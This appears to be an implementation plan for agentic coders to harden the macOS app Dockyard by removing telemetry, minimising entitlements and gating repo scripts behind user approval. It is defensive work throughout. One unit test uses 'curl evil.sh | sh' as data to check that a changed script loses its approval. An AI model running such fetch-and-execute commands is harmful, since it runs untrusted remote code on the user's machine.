# VRA Phase 1 — App Hardening Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Remove telemetry entirely, minimize macOS entitlements, and require one-time user approval before running repo-provided scripts (issue #48, Phase 1 of spec `docs/superpowers/specs/2026-07-09-vra-readiness-design.md`).

**Architecture:** A new `ScriptTrustStore` (UserDefaults-backed, keyed by project directory, value = SHA-256 fingerprint of setup/run/teardown) gates the three script-execution paths. A shared `ScriptApprovalSheet` SwiftUI view presents the exact commands for approval. Telemetry code is deleted outright; entitlements/plist keys are trimmed in `project.yml` and the two `.entitlements` files.

**Tech Stack:** Swift 6 (strict concurrency), SwiftUI, XCTest, CryptoKit (SHA-256), XcodeGen.

## Global Constraints

- All user-facing strings localized in en, ca, de, es, sv (`Localization/<locale>.lproj/Localizable.strings`). SwiftUI `Text("…")` literals auto-localize; AppKit/`String(format:)` uses `NSLocalizedString`.
- Conventional Commits format, short messages, no Co-Authored-By trailer.
- After adding/removing Swift files: `xcodegen generate` (dev.sh does this automatically on build/test).
- Build: `./scripts/dev.sh build`. Full tests: `./scripts/dev.sh test`. Single test class: `xcodebuild -project Dockyard.xcodeproj -scheme DockyardTests -configuration Debug -derivedDataPath build -clonedSourcePackagesDirPath .spm-cache -skipPackagePluginValidation test -only-testing:DockyardTests/ScriptTrustStoreTests` (run `xcodegen generate` first if files changed).
- Use "directory" not "folder"; app name via `AppConstants`.

---

### Task 1: ScriptTrustStore model

**Files:**
- Create: `Sources/Models/ScriptTrustStore.swift`
- Test: `Tests/ScriptTrustStoreTests.swift`

**Interfaces:**
- Consumes: `ScriptConfig` (existing, `Sources/Models/ScriptConfig.swift` — fields `setup/run/teardown: String?`).
- Produces (used by Tasks 4–8):
  - `ScriptTrustStore.isTrusted(projectDirectory: String, config: ScriptConfig, defaults: UserDefaults = .standard) -> Bool`
  - `ScriptTrustStore.trust(projectDirectory: String, config: ScriptConfig, defaults: UserDefaults = .standard)`
  - `ScriptTrustStore.trust(projectDirectory: String, setup: String?, run: String?, teardown: String?, defaults: UserDefaults = .standard)`

- [ ] **Step 1: Write the failing tests**

```swift
// ABOUTME: Tests for ScriptTrustStore fingerprinting and per-project trust persistence.

import XCTest
@testable import Dockyard

final class ScriptTrustStoreTests: XCTestCase {
    private var defaults: UserDefaults!

    override func setUp() {
        super.setUp()
        defaults = UserDefaults(suiteName: "ScriptTrustStoreTests")!
        defaults.removePersistentDomain(forName: "ScriptTrustStoreTests")
    }

    override func tearDown() {
        defaults.removePersistentDomain(forName: "ScriptTrustStoreTests")
        super.tearDown()
    }

    private func config(setup: String? = nil, run: String? = nil, teardown: String? = nil) -> ScriptConfig {
        ScriptConfig(setup: setup, run: run, teardown: teardown, expectedPort: nil, source: ".dockyard.json", loadError: nil)
    }

    func testEmptyConfigIsImplicitlyTrusted() {
        XCTAssertTrue(ScriptTrustStore.isTrusted(projectDirectory: "/tmp/p", config: config(), defaults: defaults))
    }

    func testUntrustedByDefaultWhenScriptsPresent() {
        XCTAssertFalse(ScriptTrustStore.isTrusted(projectDirectory: "/tmp/p", config: config(setup: "make setup"), defaults: defaults))
    }

    func testTrustThenIsTrusted() {
        let c = config(setup: "make setup", run: "make run")
        ScriptTrustStore.trust(projectDirectory: "/tmp/p", config: c, defaults: defaults)
        XCTAssertTrue(ScriptTrustStore.isTrusted(projectDirectory: "/tmp/p", config: c, defaults: defaults))
    }

    func testChangedScriptInvalidatesTrust() {
        ScriptTrustStore.trust(projectDirectory: "/tmp/p", config: config(setup: "make setup"), defaults: defaults)
        XCTAssertFalse(ScriptTrustStore.isTrusted(projectDirectory: "/tmp/p", config: config(setup: "curl evil.sh | sh"), defaults: defaults))
    }

    func testNilVersusEmptyStringAreDistinct() {
        ScriptTrustStore.trust(projectDirectory: "/tmp/p", config: config(setup: "", run: "x"), defaults: defaults)
        XCTAssertFalse(ScriptTrustStore.isTrusted(projectDirectory: "/tmp/p", config: config(setup: nil, run: "x"), defaults: defaults))
    }

    func testFieldShiftDoesNotCollide() {
        // setup="a" must not fingerprint the same as run="a"
        ScriptTrustStore.trust(projectDirectory: "/tmp/p", config: config(setup: "a"), defaults: defaults)
        XCTAssertFalse(ScriptTrustStore.isTrusted(projectDirectory: "/tmp/p", config: config(run: "a"), defaults: defaults))
    }

    func testTrustIsPerProject() {
        let c = config(setup: "make setup")
        ScriptTrustStore.trust(projectDirectory: "/tmp/a", config: c, defaults: defaults)
        XCTAssertFalse(ScriptTrustStore.isTrusted(projectDirectory: "/tmp/b", config: c, defaults: defaults))
    }

    func testTrustWithRawFields() {
        ScriptTrustStore.trust(projectDirectory: "/tmp/p", setup: "s", run: nil, teardown: "t", defaults: defaults)
        XCTAssertTrue(ScriptTrustStore.isTrusted(projectDirectory: "/tmp/p", config: config(setup: "s", teardown: "t"), defaults: defaults))
    }
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `./scripts/dev.sh test` filtered per Global Constraints (`-only-testing:DockyardTests/ScriptTrustStoreTests`).
Expected: compile FAILURE — `cannot find 'ScriptTrustStore' in scope`.

- [ ] **Step 3: Implement ScriptTrustStore**

```swift
// ABOUTME: Tracks which projects' setup/run/teardown scripts the user has approved.
// ABOUTME: Fingerprints script content so any change requires re-approval.

import CryptoKit
import Foundation

enum ScriptTrustStore {
    private static let userDefaultsKey = "dockyard.trustedScripts"

    /// A config with no scripts needs no approval.
    static func isTrusted(projectDirectory: String, config: ScriptConfig, defaults: UserDefaults = .standard) -> Bool {
        guard config.hasAnyScript else { return true }
        let stored = defaults.dictionary(forKey: userDefaultsKey) as? [String: String] ?? [:]
        return stored[projectDirectory] == fingerprint(setup: config.setup, run: config.run, teardown: config.teardown)
    }

    static func trust(projectDirectory: String, config: ScriptConfig, defaults: UserDefaults = .standard) {
        trust(projectDirectory: projectDirectory, setup: config.setup, run: config.run, teardown: config.teardown, defaults: defaults)
    }

    static func trust(projectDirectory: String, setup: String?, run: String?, teardown: String?, defaults: UserDefaults = .standard) {
        var stored = defaults.dictionary(forKey: userDefaultsKey) as? [String: String] ?? [:]
        stored[projectDirectory] = fingerprint(setup: setup, run: run, teardown: teardown)
        defaults.set(stored, forKey: userDefaultsKey)
    }

    /// Length-prefixed framing keeps nil/empty/shifted fields from colliding.
    private static func fingerprint(setup: String?, run: String?, teardown: String?) -> String {
        let framed = [("setup", setup), ("run", run), ("teardown", teardown)].map { name, value -> String in
            guard let value else { return "\(name):nil;" }
            return "\(name):\(value.utf8.count):\(value);"
        }.joined()
        let digest = SHA256.hash(data: Data(framed.utf8))
        return digest.map { String(format: "%02x", $0) }.joined()
    }
}
```

Note: `ScriptConfig`'s memberwise init is internal — tests construct it directly; if compilation fails on init visibility, it won't (struct, internal by default).

- [ ] **Step 4: Run tests to verify they pass**

Same command. Expected: 8 tests PASS.

- [ ] **Step 5: Commit**

```bash
git add Sources/Models/ScriptTrustStore.swift Tests/ScriptTrustStoreTests.swift
git commit -m "feat: add ScriptTrustStore for per-project script approval"
```

---

### Task 2: Delete telemetry

**Files:**
- Delete: `Sources/Models/Telemetry.swift`
- Modify: `Sources/DockyardApp.swift` (~line 224), `Sources/Models/WorkstreamArchiver.swift` (~69), `Sources/Views/SettingsView.swift` (24, ~347–354, ~406–410), `Sources/Views/TerminalContainerView.swift` (~1078, 1088, 1107, 1123), `Sources/Views/ContentView.swift` (~596)
- Modify: `Localization/{en,ca,de,es,sv}.lproj/Localizable.strings`

**Interfaces:** none produced; removes `Telemetry` symbol entirely.

- [ ] **Step 1: Remove all call sites**

  - `DockyardApp.swift`: in `.onAppear`, replace `Telemetry.shared.trackLaunch()` with legacy-key cleanup:
    ```swift
    // Telemetry was removed; clear identifiers persisted by older versions.
    UserDefaults.standard.removeObject(forKey: "dockyard.telemetryEnabled")
    UserDefaults.standard.removeObject(forKey: "dockyard.installationID")
    ```
  - `WorkstreamArchiver.swift:69`: delete the `Telemetry.shared.track("workstream_archived"...)` line.
  - `SettingsView.swift`: delete `@AppStorage("dockyard.telemetryEnabled")` (line 24); delete the `.onChange(of: tmuxMode) { ... Telemetry.shared.track(...) }` modifier (keep the toggle itself); delete the `SettingToggle("Usage analytics", ...)` block in the Advanced section.
  - `TerminalContainerView.swift`: delete the four `Telemetry.shared.track("tab_opened"...)` lines in `addTerminal`, `addBrowser`, `addTerminalEditor`, `addEditor`.
  - `ContentView.swift:596`: delete the `Telemetry.shared.track("workstream_created"...)` line.

- [ ] **Step 2: Delete the file and regenerate project**

```bash
git rm Sources/Models/Telemetry.swift
xcodegen generate
```

- [ ] **Step 3: Remove orphaned locale strings**

In all 5 `Localizable.strings` files remove the keys:
- `"Usage analytics"`
- `"Send anonymous usage data to help improve Dockyard. We collect: app version, build type, macOS version, locale, and screen resolution. No project names, file contents, or personal data."`

Verify no other file references them: `grep -rn "Usage analytics" Sources/ Localization/` → no hits.

- [ ] **Step 4: Build and test**

Run: `./scripts/dev.sh build` then `./scripts/dev.sh test`.
Expected: build succeeds; `grep -rn "Telemetry" Sources/ Tests/` → no hits.

- [ ] **Step 5: Commit**

```bash
git add -A
git commit -m "feat!: remove telemetry entirely"
```

(Breaking-change marker because the Usage analytics setting disappears.)

---

### Task 3: Minimize entitlements and Info.plist usage descriptions

**Files:**
- Modify: `Resources/dy.entitlements`, `Resources/dy-local.entitlements`, `project.yml` (info properties ~lines 56–70)

- [ ] **Step 1: Trim `Resources/dy.entitlements`** to exactly:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <!-- Sandbox stays off: the app's core function is spawning the user's shell,
         git, and tmux against arbitrary project directories. -->
    <key>com.apple.security.app-sandbox</key>
    <false/>
    <!-- Self-update opens Terminal via AppleScript. -->
    <key>com.apple.security.automation.apple-events</key>
    <true/>
    <!-- Lets CLI tools inside embedded terminals request microphone access (dictation etc.). -->
    <key>com.apple.security.device.audio-input</key>
    <true/>
</dict>
</plist>
```

- [ ] **Step 2: Trim `Resources/dy-local.entitlements`** to the same three keys plus, before `</dict>`:

```xml
    <!-- Debug builds only: allows running against locally built, unsigned GhosttyKit. -->
    <key>com.apple.security.cs.disable-library-validation</key>
    <true/>
```

- [ ] **Step 3: Trim `project.yml` usage descriptions**

Remove these keys: `NSBluetoothAlwaysUsageDescription`, `NSCalendarsUsageDescription`, `NSCameraUsageDescription`, `NSContactsUsageDescription`, `NSLocationTemporaryUsageDescriptionDictionary`, `NSLocationUsageDescription`, `NSMotionUsageDescription`, `NSPhotoLibraryUsageDescription`, `NSRemindersUsageDescription`, `NSSystemAdministrationUsageDescription`.
Keep: `NSAppleEventsUsageDescription`, `NSAudioCaptureUsageDescription`, `NSLocalNetworkUsageDescription`, `NSMicrophoneUsageDescription`, `NSSpeechRecognitionUsageDescription` (speech recognition pairs with dictation/microphone and needs no entitlement).

- [ ] **Step 4: Regenerate, build, verify**

```bash
xcodegen generate && ./scripts/dev.sh build
codesign -d --entitlements - build/Build/Products/Debug/Dockyard.app 2>/dev/null | grep -c "personal-information"
```
Expected: build succeeds; grep count `0`.

- [ ] **Step 5: Commit**

```bash
git add Resources/dy.entitlements Resources/dy-local.entitlements project.yml
git commit -m "feat: minimize entitlements to apple-events and audio-input"
```

---

### Task 4: ScriptApprovalSheet view + localization

**Files:**
- Create: `Sources/Views/ScriptApprovalSheet.swift`
- Modify: `Localization/{en,ca,de,es,sv}.lproj/Localizable.strings`

**Interfaces:**
- Produces (used by Tasks 5–7):
  ```swift
  struct ScriptApprovalSheet: View {
      let source: String?          // config filename, e.g. ".dockyard.json"
      let setup: String?
      let run: String?
      let teardown: String?
      let onApprove: () -> Void    // caller stores trust and dismisses
      let onDecline: () -> Void    // caller dismisses only
  }
  ```

- [ ] **Step 1: Implement the sheet**

```swift
// ABOUTME: Confirmation sheet shown before repo-provided scripts run for the first time.
// ABOUTME: Displays the exact setup/run/teardown commands so the user can review them.

import SwiftUI

struct ScriptApprovalSheet: View {
    let source: String?
    let setup: String?
    let run: String?
    let teardown: String?
    let onApprove: () -> Void
    let onDecline: () -> Void

    var body: some View {
        VStack(alignment: .leading, spacing: 16) {
            Label("Review Project Scripts", systemImage: "exclamationmark.shield")
                .font(.headline)
            Text(String(
                format: NSLocalizedString(
                    "These commands come from %@ and will run in your shell. Review them before allowing Dockyard to run them.",
                    comment: "Script approval sheet explanation; %@ is the config filename"),
                source ?? ".dockyard.json"))
                .font(.callout)
                .foregroundStyle(.secondary)
                .fixedSize(horizontal: false, vertical: true)

            ScrollView {
                VStack(alignment: .leading, spacing: 12) {
                    scriptBlock(title: "Setup", script: setup)
                    scriptBlock(title: "Run", script: run)
                    scriptBlock(title: "Teardown", script: teardown)
                }
                .frame(maxWidth: .infinity, alignment: .leading)
            }
            .frame(maxHeight: 260)

            HStack {
                Spacer()
                Button("Not Now", action: onDecline)
                    .keyboardShortcut(.cancelAction)
                Button("Run Scripts", action: onApprove)
                    .keyboardShortcut(.defaultAction)
                    .buttonStyle(.borderedProminent)
            }
        }
        .padding(20)
        .frame(width: 480)
    }

    @ViewBuilder
    private func scriptBlock(title: LocalizedStringKey, script: String?) -> some View {
        if let script {
            VStack(alignment: .leading, spacing: 4) {
                Text(title)
                    .font(.caption)
                    .foregroundStyle(.secondary)
                Text(script)
                    .font(.system(size: 12, design: .monospaced))
                    .textSelection(.enabled)
                    .padding(8)
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .background(Color.primary.opacity(0.05))
                    .clipShape(RoundedRectangle(cornerRadius: 6, style: .continuous))
            }
        }
    }
}
```

- [ ] **Step 2: Add locale strings**

Check which keys already exist (`grep -n "\"Setup\"\|\"Run\"\|\"Teardown\"\|\"Not Now\"" Localization/en.lproj/Localizable.strings`); add the missing ones to **all 5** files:

| Key | ca | de | es | sv |
|---|---|---|---|---|
| "Review Project Scripts" | "Revisa els scripts del projecte" | "Projektskripte überprüfen" | "Revisar los scripts del proyecto" | "Granska projektets skript" |
| "These commands come from %@ and will run in your shell. Review them before allowing Dockyard to run them." | "Aquestes ordres provenen de %@ i s'executaran al teu intèrpret d'ordres. Revisa-les abans de permetre que Dockyard les executi." | "Diese Befehle stammen aus %@ und werden in deiner Shell ausgeführt. Überprüfe sie, bevor Dockyard sie ausführen darf." | "Estos comandos provienen de %@ y se ejecutarán en tu shell. Revísalos antes de permitir que Dockyard los ejecute." | "Dessa kommandon kommer från %@ och körs i ditt skal. Granska dem innan du låter Dockyard köra dem." |
| "Run Scripts" | "Executa els scripts" | "Skripte ausführen" | "Ejecutar scripts" | "Kör skript" |
| "Not Now" | "Ara no" | "Jetzt nicht" | "Ahora no" | "Inte nu" |
| "Setup" (if missing) | "Configuració" | "Einrichtung" | "Configuración" | "Konfiguration" |
| "Run" (if missing) | "Executa" | "Ausführen" | "Ejecutar" | "Kör" |
| "Teardown" (if missing) | "Desmuntatge" | "Abbau" | "Desmontaje" | "Nedmontering" |

English file: key = value for each.

- [ ] **Step 3: Build**

Run: `./scripts/dev.sh build` (dev.sh runs xcodegen). Expected: success.

- [ ] **Step 4: Commit**

```bash
git add Sources/Views/ScriptApprovalSheet.swift Localization
git commit -m "feat: add script approval sheet"
```

---

### Task 5: Gate automatic setup in TerminalContainerView

**Files:**
- Modify: `Sources/Views/TerminalContainerView.swift` (`startSetupIfNeeded` ~1321, `runSetupInNewTerminal` ~1426, body modifiers ~730)

**Interfaces:**
- Consumes: `ScriptTrustStore.isTrusted/trust` (Task 1), `ScriptApprovalSheet` (Task 4). View already has `projectDirectory`, `scriptConfig` properties.

- [ ] **Step 1: Add state and gate `startSetupIfNeeded`**

Add near other `@State` vars (~line 306): `@State private var showScriptApproval = false`.

In `startSetupIfNeeded()`, after the existing `guard setupRunner.state == .idle else { return }`, insert:

```swift
guard ScriptTrustStore.isTrusted(projectDirectory: projectDirectory, config: scriptConfig) else {
    showScriptApproval = true
    return
}
```

In `runSetupInNewTerminal()`, after `guard let setupScript = ... else { return }`, insert the same guard.

- [ ] **Step 2: Attach the sheet**

Next to the existing `.onReceive` modifiers on the main body (~line 730):

```swift
.sheet(isPresented: $showScriptApproval) {
    ScriptApprovalSheet(
        source: scriptConfig.source,
        setup: scriptConfig.setup,
        run: scriptConfig.run,
        teardown: scriptConfig.teardown,
        onApprove: {
            ScriptTrustStore.trust(projectDirectory: projectDirectory, config: scriptConfig)
            showScriptApproval = false
            startSetupIfNeeded()
        },
        onDecline: { showScriptApproval = false }
    )
}
```

- [ ] **Step 3: Build and full test**

Run: `./scripts/dev.sh test`. Expected: PASS (no behavioral tests cover auto-setup UI; suite guards regressions).

- [ ] **Step 4: Commit**

```bash
git add Sources/Views/TerminalContainerView.swift
git commit -m "feat: require script approval before automatic setup"
```

---

### Task 6: Gate setup banner + auto-trust config edits in WorkstreamInfoView

**Files:**
- Modify: `Sources/Views/WorkstreamInfoView.swift` (banner ~50, `saveEditedConfig` ~557, `confirmWrite` ~585)

**Interfaces:** consumes Task 1 + Task 4 symbols. View already has `projectDirectory`, `scriptConfig`, `setupRunner`, `onRunSetupInTerminal`.

- [ ] **Step 1: Gate the banner actions**

Add state:

```swift
@State private var showScriptApproval = false
@State private var pendingSetupAction: PendingSetupAction?

private enum PendingSetupAction { case inline, terminal }
```

Replace the `SetupStatusBanner` closures:

```swift
onStart: { requestSetupStart(.inline) },
onCancel: { setupRunner.cancel() },
onRunInTerminal: { requestSetupStart(.terminal) }
```

Add helpers:

```swift
private func requestSetupStart(_ action: PendingSetupAction) {
    guard ScriptTrustStore.isTrusted(projectDirectory: projectDirectory, config: scriptConfig) else {
        pendingSetupAction = action
        showScriptApproval = true
        return
    }
    performSetupAction(action)
}

private func performSetupAction(_ action: PendingSetupAction) {
    switch action {
    case .inline:
        guard let setup = scriptConfig.setup else { return }
        setupRunner.start(script: setup, workingDirectory: workingDirectory, environmentVars: environmentVars)
    case .terminal:
        onRunSetupInTerminal()
    }
}
```

Attach to the view body:

```swift
.sheet(isPresented: $showScriptApproval) {
    ScriptApprovalSheet(
        source: scriptConfig.source,
        setup: scriptConfig.setup,
        run: scriptConfig.run,
        teardown: scriptConfig.teardown,
        onApprove: {
            ScriptTrustStore.trust(projectDirectory: projectDirectory, config: scriptConfig)
            showScriptApproval = false
            if let action = pendingSetupAction { performSetupAction(action) }
            pendingSetupAction = nil
        },
        onDecline: { showScriptApproval = false; pendingSetupAction = nil }
    )
}
```

- [ ] **Step 2: Auto-trust user-typed configs**

In `saveEditedConfig()` and `confirmWrite()`, immediately after each successful `try DockyardConfigWriter.write(...)`, add (using that function's draft variable):

```swift
ScriptTrustStore.trust(projectDirectory: projectDirectory, setup: result.draft.setup, run: result.draft.run, teardown: result.draft.teardown)
```

(in `confirmWrite`, the variable is `draft`). If the draft type's fields differ, match the actual `StackDetector`/draft property names (`setup`, `run`, `teardown` on the draft struct — verify in `Sources/Models/StackDetector.swift`).

- [ ] **Step 3: Build and test**

Run: `./scripts/dev.sh test`. Expected: PASS.

- [ ] **Step 4: Commit**

```bash
git add Sources/Views/WorkstreamInfoView.swift
git commit -m "feat: gate setup banner behind script approval; auto-trust edited configs"
```

---

### Task 7: Gate run start in EnvironmentTabView

**Files:**
- Modify: `Sources/Views/EnvironmentTabView.swift` (run-start sites ~lines 57–63, 78–81, 116–122, 144–148)

**Interfaces:** consumes Task 1 + Task 4 symbols. View already has `projectDirectory`, `scriptConfig`, `@Binding var runStarted`.

- [ ] **Step 1: Add a single choke point**

```swift
@State private var showScriptApproval = false

private func requestRunStart() {
    guard ScriptTrustStore.isTrusted(projectDirectory: projectDirectory, config: scriptConfig) else {
        showScriptApproval = true
        return
    }
    runStarted = true
}
```

Replace every site that sets `runStarted = true` to start a run (the `.rerunScript` onReceive else-branch, the two Start buttons, the `EnvActionButton` Start) with `requestRunStart()`, preserving any surrounding statements. Do NOT touch `restartRun()`/`stopRun()` internals (restart implies an earlier approved start).

Attach the sheet to the view body:

```swift
.sheet(isPresented: $showScriptApproval) {
    ScriptApprovalSheet(
        source: scriptConfig.source,
        setup: scriptConfig.setup,
        run: scriptConfig.run,
        teardown: scriptConfig.teardown,
        onApprove: {
            ScriptTrustStore.trust(projectDirectory: projectDirectory, config: scriptConfig)
            showScriptApproval = false
            runStarted = true
        },
        onDecline: { showScriptApproval = false }
    )
}
```

- [ ] **Step 2: Build and test**

Run: `./scripts/dev.sh test`. Expected: PASS (EnvironmentTabViewTests still green).

- [ ] **Step 3: Commit**

```bash
git add Sources/Views/EnvironmentTabView.swift
git commit -m "feat: require script approval before starting run script"
```

---

### Task 8: Skip untrusted teardown

**Files:**
- Modify: `Sources/Models/ScriptConfig.swift` (`runTeardown` ~52)
- Test: `Tests/ScriptConfigTests.swift`

**Interfaces:**
- Changes signature to `static func runTeardown(in directory: String, projectDirectory: String, defaults: UserDefaults = .standard)` — existing caller (`WorkstreamArchiver.swift:71`) compiles unchanged.

- [ ] **Step 1: Write failing tests** (append to `ScriptConfigTests`, following that file's temp-directory idiom)

```swift
func testRunTeardownSkipsUntrustedScripts() throws {
    let dir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
    try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: dir) }
    let marker = dir.appendingPathComponent("teardown-ran")
    let json = "{ \"teardown\": \"touch '\(marker.path)'\" }"
    try json.write(to: dir.appendingPathComponent(".dockyard.json"), atomically: true, encoding: .utf8)

    let defaults = UserDefaults(suiteName: "ScriptConfigTeardownTests")!
    defaults.removePersistentDomain(forName: "ScriptConfigTeardownTests")

    ScriptConfig.runTeardown(in: dir.path, projectDirectory: dir.path, defaults: defaults)
    XCTAssertFalse(FileManager.default.fileExists(atPath: marker.path), "untrusted teardown must not run")

    let config = ScriptConfig.load(from: dir.path)
    ScriptTrustStore.trust(projectDirectory: dir.path, config: config, defaults: defaults)
    ScriptConfig.runTeardown(in: dir.path, projectDirectory: dir.path, defaults: defaults)
    XCTAssertTrue(FileManager.default.fileExists(atPath: marker.path), "trusted teardown must run")
}
```

- [ ] **Step 2: Run to verify failure**

Run tests for `DockyardTests/ScriptConfigTests`. Expected: FAIL — `runTeardown` has no `defaults` parameter (compile error) or marker exists.

- [ ] **Step 3: Implement**

In `runTeardown`, change the signature to include `defaults: UserDefaults = .standard` and after `guard let teardown = config.teardown else { return }` insert:

```swift
guard ScriptTrustStore.isTrusted(projectDirectory: projectDirectory, config: config, defaults: defaults) else {
    logger.notice("Skipping teardown for \(directory, privacy: .public): scripts not approved")
    return
}
```

- [ ] **Step 4: Run tests to verify pass**

Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add Sources/Models/ScriptConfig.swift Tests/ScriptConfigTests.swift
git commit -m "feat: skip teardown scripts the user never approved"
```

---

### Task 9: Full verification

- [ ] **Step 1: Full suite**

Run: `./scripts/dev.sh test`. Expected: all tests PASS.

- [ ] **Step 2: Manual smoke (app run)**

Run: `./scripts/dev.sh br`. Verify:
1. Settings → Advanced shows no "Usage analytics" toggle.
2. Open a project with a `.dockyard.json` containing scripts whose trust isn't stored → creating/opening a workstream shows the approval sheet listing the commands; "Not Now" leaves setup unstarted; reopening and approving runs setup.
3. `defaults read com.barnolacesc.dockyard dockyard.installationID` → "does not exist".

- [ ] **Step 3: Update TODO.md / issue notes**

Add a line to `TODO.md` under completed/Phase-1 noting Phases 2–3 of issue #48 remain (docs, CI).

- [ ] **Step 4: Commit any remaining changes**

```bash
git add -A && git commit -m "chore: phase 1 verification notes"
```
